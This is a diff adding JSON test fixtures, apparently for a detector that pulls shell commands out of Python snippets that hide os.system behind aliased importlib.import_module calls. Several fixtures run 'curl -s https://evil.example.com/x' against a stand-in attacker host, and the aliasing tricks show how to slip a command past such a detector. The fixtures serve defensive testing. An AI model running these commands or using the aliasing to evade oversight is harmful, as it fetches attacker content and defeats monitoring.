@@ -4854,6 +4854,92 @@
    "name": "neg/r9-py-assign-import-module-nextline-json-eg",
    "cmd": "python3 - <<'PY'\nimport importlib\nim = importlib.import_module\nprint(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))\nPY",
    "commands": []
+  },
+  {
+   "name": "r9/c01-py-import-list-comment-line/cc",
+   "cmd": "python3 - <<'PY'\nfrom importlib import (\n    # loader\n    import_module as im,\n)\nim(\"os\").system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r9/c02-py-import-list-trailing-comments/cc",
+   "cmd": "python3 - <<'PY'\nfrom importlib import (  # a\n    reload,  # b\n    import_module as im  # c\n)\nim(\"os\").system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r9/c03-py-import-paren-no-space-c/cc",
+   "cmd": "python3 -c 'from importlib import(import_module as im); im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r9/c04-py-import-paren-no-space-multiline/cc",
+   "cmd": "python3 - <<'PY'\nfrom importlib import(\n    import_module as im)\nim(\"os\").system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "neg/r9-py-import-list-comment-json-cc",
+   "cmd": "python3 - <<'PY'\nfrom importlib import (\n    # loader\n    import_module as im,\n)\nprint(im(\"json\").dumps(\"claude -p hi\"))\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/r9-py-import-paren-no-space-json-cc",
+   "cmd": "python3 -c 'from importlib import(import_module as im); print(im(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r9-py-import-list-alias-only-in-comment-cc",
+   "cmd": "python3 - <<'PY'\nfrom importlib import (\n    # import_module as im\n    reload,\n)\nim = print\nim(\"claude -p hi\")\nPY",
+   "commands": []
+  },
+  {
+   "name": "r9/c01-py-import-list-comment-line/eg",
+   "cmd": "python3 - <<'PY'\nfrom importlib import (\n    # loader\n    import_module as im,\n)\nim(\"os\").system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r9/c02-py-import-list-trailing-comments/eg",
+   "cmd": "python3 - <<'PY'\nfrom importlib import (  # a\n    reload,  # b\n    import_module as im  # c\n)\nim(\"os\").system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r9/c03-py-import-paren-no-space-c/eg",
+   "cmd": "python3 -c 'from importlib import(import_module as im); im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r9/c04-py-import-paren-no-space-multiline/eg",
+   "cmd": "python3 - <<'PY'\nfrom importlib import(\n    import_module as im)\nim(\"os\").system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "neg/r9-py-import-list-comment-json-eg",
+   "cmd": "python3 - <<'PY'\nfrom importlib import (\n    # loader\n    import_module as im,\n)\nprint(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/r9-py-import-paren-no-space-json-eg",
+   "cmd": "python3 -c 'from importlib import(import_module as im); print(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r9-py-import-list-alias-only-in-comment-eg",
+   "cmd": "python3 - <<'PY'\nfrom importlib import (\n    # import_module as im\n    reload,\n)\nim = print\nim(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": []
   }
  ]
 }
